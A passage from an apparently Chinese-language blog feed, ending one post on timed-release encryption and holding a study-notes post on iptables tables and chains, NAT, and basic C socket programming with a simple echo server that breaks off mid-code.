xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>U</mi><mi>T</mi></msub><mo>=</mo><mi>u</mi><mi>s</mi><mi>k</mi><mo>⋅</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mi>u</mi><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">U_T=usk\cdot H_1(T)=uH_1(T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//接收方计算UT,K&#x27;，计算M</span><br>ECn UT = usk * <span class="hljs-built_in">map_to_point</span>(T, cof);<br></code></pre></td></tr></table></figure></li><li><p>接收方计算</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>时控性加密</tag>
      
      <tag>算法实现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>零信任</title>
    <link href="/2023/07/10/%E9%9B%B6%E4%BF%A1%E4%BB%BB/"/>
    <url>/2023/07/10/%E9%9B%B6%E4%BF%A1%E4%BB%BB/</url>
    
    <content type="html"><![CDATA[<p>最近在学零信任相关的知识，给记录下来方便以后查阅</p><h1 id="Iptables原理">Iptables原理</h1><p>iptables就是linux中的防火墙工具，其中的四表五链比较重要，并且用了c的底层编写。</p><h2 id="四表">四表</h2><ul><li>raw 表的作用是将命中规则的包，跳过其它表的处理，它的优先级最高。</li><li>mangle 表的作用是根据规则修改数据包的一些标志位，比如 TTL</li><li>nat 表的作用是实现网络地址转换</li><li>filter 表的作用是过滤某些包，这是防火墙工作的基础</li></ul><h3 id="filter-过滤表">filter(过滤表)</h3><p>包含三个规则链</p><ul><li>INPUT 输入链,处理目标地址为本机 IP 地址的报文。</li><li>OUTPUT 输出链,处理本机 IP 地址产生的报文。</li><li>FORWARD 转发链,处理经过本机路由的报文。</li></ul><p>经过本机转发的报文经过 FORWARD 链,不经过 IPPUT 链和 OUTPUT 链。</p><h3 id="nat-网络地址转换表">nat(网络地址转换表)</h3><p>先科普一下网络地址转换是什么</p><p>NAT的主要功能是将源IP地址和/或目标IP地址在数据包经过网络边界设备（如路由器或防火墙）时进行转换。这种转换可以在不同层级上进行，包括网络层（IP地址转换）和传输层（端口转换）。</p><ol><li>源地址转换（Source NAT，SNAT）：将私有网络内部主机的源IP地址转换为公共网络上的一个IP地址。这允许私有网络中的主机通过共享单个公共IP地址来访问互联网。</li><li>目标地址转换（Destination NAT，DNAT）：将公共网络上的目标IP地址转换为私有网络内部主机的一个IP地址。这允许从公共网络访问特定服务或应用程序时，将流量定向到私有网络中的特定主机或服务器。</li><li>端口地址转换（Port Address Translation，PAT）：在NAT过程中同时转换IP地址和端口号。通过在传输层级别上对端口号进行转换，可以将多个私有网络主机共享单个公共IP地址。</li></ol><p>nat 用来完成源/目的地址和端口的转换,当一个报文在创建一个新的连接时进入该表。它也有 3 个内置规则链。</p><ul><li>PREROUTING:用于修改到来的报文,只用来做网络地址转换。</li><li>OUTPUT:用于修改本机产生的并且在路由处理之前的报文。</li><li>POSTROUTING:用于对转换后的数据包进行进一步处理，比如修改数据包的源地址、源端口。</li></ul><h2 id="mangle-修改表">mangle(修改表)</h2><p>这个表主要用来进行报文修改,有 5 个内置规则链。</p><ul><li>PREROUTING：针对到来的报文,在路由之前修改的地方。</li><li>INPUT：针对目的地址为网关本身的报文。</li><li>FORWARD：针对通过网关路由转发的报文。</li><li>POSTROUTING：将要发送出去的报文的地方。</li><li>OUTPUT：本机产生报文在路由之前修改的地方。</li></ul><p>通常使用该表进行报文修改,以便进行 QoS 和策略路由。通常每一个报文都进入该表，但不使用它来做报文过滤。</p><h3 id="raw-原始表">raw(原始表)</h3><p>这个表主要用于配置连接跟踪相关内容,在 ip_conntrack 之前调用。</p><ul><li>PREPROUTING:到达本机的报文。</li><li>OUTPUT:本机进程产生的报文。</li></ul><p>这里是能够在连接跟踪生效前处理报文的地方,你可以标记符合某种条件的报文不被连接跟踪处理。</p><h3 id="security-表-新增">security 表(新增)</h3><p>这个表用于安全 Linux 的防火墙规则,是 iptables 最近的新增表,在实际项目中还很少用到。</p><h2 id="五链">五链</h2><p>五链刚刚已经基本上都提到了，下面将根据信息在防火墙中的处理方式来进一步加深理解。</p><p>（1）当一个数据包进入网卡时，它首先进入<font color=Red>PREROUTING</font>链，内核根据数据包目的IP判断是否需要转送出去。</p><p>（2）如果数据包就是进入本机的，它就会沿着图向下移动，到达<font color=Red>INPUT</font>链。数据包到了<font color=Red>INPUT</font>链后，任何进程都会收到它。本机上运行的程序可以发送数据包，这些数据包会经过<font color=Red>OUTPUT</font>链，然后到达<font color=Red>POSTROUTING</font>链输出。</p><p>（3）如果数据包是要转发出去的，且内核允许转发，数据包就会如图所示向右移动，经过<font color=Red>FORWARD</font>链，然后到达<font color=Red>POSTROUTING</font>链输出。</p><p>数据接收处理流程：<strong>PREROUTING链 -&gt; 路由判断（是本机）-&gt; INPUT链</strong> -&gt; …</p><p>本机发送数据包流程：<strong>路由选择</strong> -&gt; <strong>OUTPUT链</strong> -&gt; <strong>POSTROUTING链</strong> -&gt; …</p><p>转发数据流程：<strong>PREROUTING链</strong> -&gt; 路由判断（不是本设备，找到下一跳） -&gt; <strong>FORWARD链</strong> -&gt; <strong>POSTROUTING链</strong> -&gt; …</p><p>所以四表五链的关系如图所示</p><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/Iptables_1.png" alt="iptables_1"></p><p>解答：多个钩子可以处理不同的应用场景，数据接收，数据发送和数据转发需要不一样的策略。所以不能单单使用一个钩子解决，实际问题是复杂的而不是单一的。</p><h1 id="Socket编程">Socket编程</h1><p>在TCP/IP协议中，“IP地址+TCP或UDP端口号”唯一标识网络通讯中的一个进程。“IP地址+端口号”就对应一个socket。欲建立连接的两个进程各自有一个socket来标识，那么这两个socket组成的socket pair就唯一标识一个连接。因此可以用Socket来描述网络连接的一对一关系。</p><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB%5CSocket_1.png" alt="Socket_1"></p><h2 id="后记">后记</h2><p>在防火墙中，锚点是一种机制，用于将一组规则绑定到特定的网络接口、IP地址、协议或服务等。锚点提供了一种有组织的方式来管理和应用规则集，以根据特定的条件对网络流量进行处理。</p><h2 id="网络字节序">网络字节序</h2><p>内存中的多字节数据相对于内存地址有大端和小端之分，发送主机通常将发送缓冲区中的数据按内存地址从低到高的顺序发出，接收主机把从网络上接到的字节依次保存在接收缓冲区中，也是按内存地址从低到高的顺序保存，因此，网络数据流的地址应这样规定：先发出的数据是低地址，后发出的数据是高地址。</p><p>TCP/IP协议规定，网络数据流应采用大端字节序，所以可能需要用到字节序转换</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">htonl</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> hostlong)</span>; <span class="hljs-comment">//IP</span><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">htons</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> hostshort)</span>; <span class="hljs-comment">//port</span><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">ntohl</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> netlong)</span>; <span class="hljs-comment">//IP</span><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">ntohs</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> netshort)</span>; <span class="hljs-comment">//port</span><br></code></pre></td></tr></table></figure><p>h表示host，n表示network，l表示long，32位长整数，s表示short，16位短整数。</p><p>如果主机是小端字节序，这些函数将参数做相应的大小端转换然后返回，如果主机是大端字节序，这些函数不做转换，将参数原封不动地返回。</p><h2 id="IP地址转换函数">IP地址转换函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">inet_pton</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *src, <span class="hljs-type">void</span> *dst)</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">作用：将本地字节序(string IP)转换成网络字节序</span><br><span class="hljs-comment">参数列表：</span><br><span class="hljs-comment">af:协议类型，AF_INET是ipv4，AF_INET是ipv6</span><br><span class="hljs-comment">src:传入参数，IP地址(点分十进制形式)</span><br><span class="hljs-comment">dst:传出参数，转换后的网络字节序IP地址</span><br><span class="hljs-comment">返回值：</span><br><span class="hljs-comment">成功：返回1</span><br><span class="hljs-comment">异常：返回0，src不是有效的IP地址</span><br><span class="hljs-comment">失败：返回-1</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">inet_ntop</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *src, <span class="hljs-type">char</span> *dst, <span class="hljs-type">socklen_t</span> size)</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">作用：将本地字节序(string IP)转换成网络字节序</span><br><span class="hljs-comment">参数列表：</span><br><span class="hljs-comment">af:协议类型，AF_INET是ipv4，AF_INET是ipv6</span><br><span class="hljs-comment">src:网络字节序IP地址</span><br><span class="hljs-comment">dst:本地字节序IP地址</span><br><span class="hljs-comment">size:dst</span><br><span class="hljs-comment">返回值：</span><br><span class="hljs-comment">成功：返回dst</span><br><span class="hljs-comment">失败：返回NULL</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>支持IPv4和IPv6</p><p>可重入函数</p><p>其中inet_pton和inet_ntop不仅可以转换IPv4的in_addr，还可以转换IPv6的in6_addr。</p><p>因此函数接口是void *addrptr。</p><h2 id="sockaddr结构">sockaddr结构</h2><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB%5CSocket_2.png" alt="socket_2"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> &#123;</span><br><span class="hljs-type">sa_family_t</span> sin_family; <span class="hljs-comment">/* Address family */</span>  地址结构类型<br><span class="hljs-type">in_port_t</span> sin_port; <span class="hljs-comment">/* Port number */</span>端口号<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">sin_addr</span>;</span><span class="hljs-comment">/* Internet address */</span>IP地址<br><span class="hljs-comment">/* Pad to size of `struct sockaddr&#x27;. */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> __pad[__SOCK_SIZE__ - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">short</span> <span class="hljs-type">int</span>) -<br><span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span>) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> in_addr)];<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> &#123;</span><span class="hljs-comment">/* Internet address. */</span><br>__be32 s_addr;<br>&#125;;<br></code></pre></td></tr></table></figure><p>示例代码</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nim">struct sockaddr_in <span class="hljs-keyword">addr</span>;<br><br><span class="hljs-keyword">addr</span>.sin_family = <span class="hljs-type">AF_INET</span>/<span class="hljs-type">AF_INET6</span><br><br><span class="hljs-keyword">addr</span>.sin_port = htons(<span class="hljs-number">9527</span>);<br><br><span class="hljs-type">int</span> dst;<br><br>inet_pton(<span class="hljs-type">AF_INET</span>, <span class="hljs-string">&quot;192.157.22.45&quot;</span>, (<span class="hljs-type">void</span> *)&amp;dst);<br><br><span class="hljs-keyword">addr</span>.sin_addr.s_addr = dst;<br><br>【*】<span class="hljs-keyword">addr</span>.sin_addr.s_addr = htonl(<span class="hljs-type">INADDR_ANY</span>);取出系统中有效的任意<span class="hljs-type">IP</span>地址。二进制类型。<br><br><span class="hljs-keyword">bind</span>(fd, (struct sockaddr *)&amp;<span class="hljs-keyword">addr</span>, size);<br></code></pre></td></tr></table></figure><h2 id="网络套接字函数">网络套接字函数</h2><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB%5CSocket_3.png" alt="Socket_3"></p><h3 id="socket函数">socket函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span> <span class="hljs-comment">/* See NOTES */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">socket</span><span class="hljs-params">(<span class="hljs-type">int</span> domain, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> protocol)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">domain:<br>AF_INET 这是大多数用来产生<span class="hljs-built_in">socket</span>的协议，使用TCP或UDP来传输，用IPv4的地址<br>AF_INET6 与上面类似，不过是来用IPv6的地址<br>AF_UNIX 本地协议，使用在Unix和Linux系统上，一般都是当客户端和服务器在同一台及其上的时候使用<br>type:<br>SOCK_STREAM 这个协议是按照顺序的、可靠的、数据完整的基于字节流的连接。这是一个使用最多的<span class="hljs-built_in">socket</span>类型，这个<span class="hljs-built_in">socket</span>是使用TCP来进行传输。<br>SOCK_DGRAM 这个协议是无连接的、固定长度的传输调用。该协议是不可靠的，使用UDP来进行它的连接。<br>SOCK_SEQPACKET该协议是双线路的、可靠的连接，发送固定长度的数据包进行传输。必须把这个包完整的接受才能进行读取。<br>SOCK_RAW <span class="hljs-built_in">socket</span>类型提供单一的网络访问，这个<span class="hljs-built_in">socket</span>类型使用ICMP公共协议。（ping、traceroute使用该协议）<br>SOCK_RDM 这个类型是很少使用的，在大部分的操作系统上没有实现，它是提供给数据链路层使用，不保证数据包的顺序<br>protocol:<br>传<span class="hljs-number">0</span> 表示使用默认协议。<br>返回值：<br>成功：返回指向新创建的<span class="hljs-built_in">socket</span>的文件描述符，失败：返回<span class="hljs-number">-1</span>，设置errno<br></code></pre></td></tr></table></figure><p>socket()打开一个网络通讯端口，如果成功的话，就像open()一样返回一个文件描述符，应用程序可以像读写文件一样用read/write在网络上收发数据，如果socket()调用出错则返回-1。对于IPv4，domain参数指定为AF_INET。对于TCP协议，type参数指定为SOCK_STREAM，表示面向流的传输协议。如果是UDP协议，则type参数指定为SOCK_DGRAM，表示面向数据报的传输协议。protocol参数的介绍从略，指定为0即可。</p><h3 id="bind函数">bind函数</h3><p>服务器程序所监听的网络地址和端口号通常是固定不变的，客户端程序得知服务器程序的地址和端口号后就可以向服务器发起连接，因此服务器需要调用bind绑定一个固定的网络地址和端口号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span> <span class="hljs-comment">/* See NOTES */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bind</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> addrlen)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sockfd：<br>socket文件描述符<br><span class="hljs-keyword">addr:</span><br><span class="hljs-keyword"></span>构造出IP地址加端口号<br>(struct sockaddr *)&amp;<span class="hljs-keyword">addr</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">addrlen:</span><br><span class="hljs-keyword"></span>sizeof(<span class="hljs-keyword">addr)长度</span><br><span class="hljs-keyword"></span>返回值：<br>成功返回<span class="hljs-number">0</span>，失败返回-<span class="hljs-number">1</span>, 设置errno<br></code></pre></td></tr></table></figure><h2 id="listen函数">listen函数</h2><p>listen函数用来设置和服务器连接的主机上限，并不是监听！</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span> <span class="hljs-comment">/* See NOTES */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">listen</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">int</span> backlog)</span></span>;<br>sockfd:<br>socket文件描述符<br>backlog:<br>连接上限，最大值<span class="hljs-number">128</span><br>返回值：<br>成功：返回<span class="hljs-number">0</span><br>失败：返回<span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><h2 id="accept函数">accept函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span> <span class="hljs-comment">/* See NOTES */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">accept</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> *addrlen)</span></span>;<br>sockdf:<br>socket文件描述符<br>addr:<br>传出参数，返回链接客户端地址信息，含IP地址和端口号<br>addrlen:<br>传入传出参数（值-结果）,传入<span class="hljs-built_in">sizeof</span>(addr)大小，函数返回时返回真正接收到地址结构体的大小<br>返回值：<br>成功返回一个新的socket文件描述符，用于和客户端通信，失败返回<span class="hljs-number">-1</span>，设置errno<br></code></pre></td></tr></table></figure><p>accept函数使用示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>cliaddr_len = <span class="hljs-keyword">sizeof</span>(cliaddr);<br>connfd = accept(listenfd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;cliaddr, &amp;cliaddr_len);<br>n = read(connfd, buf, MAXLINE);<br>......<br>close(connfd);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="connect函数">connect函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span> <span class="hljs-comment">/* See NOTES */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> addrlen)</span></span>;<br>sockdf:<br>socket文件描述符<br>addr:<br>传入参数，指定服务器端地址信息，含IP地址和端口号<br>addrlen:<br>传入参数,传入<span class="hljs-built_in">sizeof</span>(addr)大小<br>返回值：<br>成功返回<span class="hljs-number">0</span>，失败返回<span class="hljs-number">-1</span>，设置errno<br></code></pre></td></tr></table></figure><h2 id="server">server</h2><p>下面通过最简单的客户端/服务器程序的实例来学习socket API。</p><p>server.c的作用是从客户端读字符，然后将每个字符转换为大写并回送给客户端。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERV_PORT 6666</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">servaddr</span>, <span class="hljs-title">cliaddr</span>;</span><br><span class="hljs-type">socklen_t</span> cliaddr_len;<br><span class="hljs-type">int</span> listenfd, connfd;<br><span class="hljs-type">char</span> buf[MAXLINE];<br><span class="hljs-type">char</span> str[INET_ADDRSTRLEN];<br><span class="hljs-type">int</span> i, n;<br><br>listenfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><br>bzero(&amp;servaddr, <span class="hljs-keyword">sizeof</span>(servaddr));<br>servaddr.sin_family = AF_INET;<br>servaddr.sin_addr.s_addr = htonl(INADDR_ANY);<br>servaddr.sin_port = htons(SERV_PORT);<br><br>bind(listenfd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;servaddr, <span class="hljs-keyword">sizeof</span>(servaddr));<br>listen(listenfd, <span class="hljs-number">20</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepting connections ...\n&quot;</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>cliaddr_len = <span class="hljs-keyword">sizeof</span>(cliaddr);<br>connfd = accept(listenfd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;cliaddr, &amp;cliaddr_len);<br>n = read(connfd, buf, MAXLINE);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;received from %s at PORT %d\n&quot;</span>,<br>inet_ntop(AF_INET, &amp;cliaddr.sin_addr, str, <span class="hljs-keyword">sizeof</span>(str)),<br>ntohs(cliaddr.sin_port));<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>buf[i] = <span class="hljs-built_in">toupper</span>(buf[i]);<br>write(connfd, buf, n);<br>close(connfd);<br>&#125;<br><span class="hljs-keyword">return</span> <span 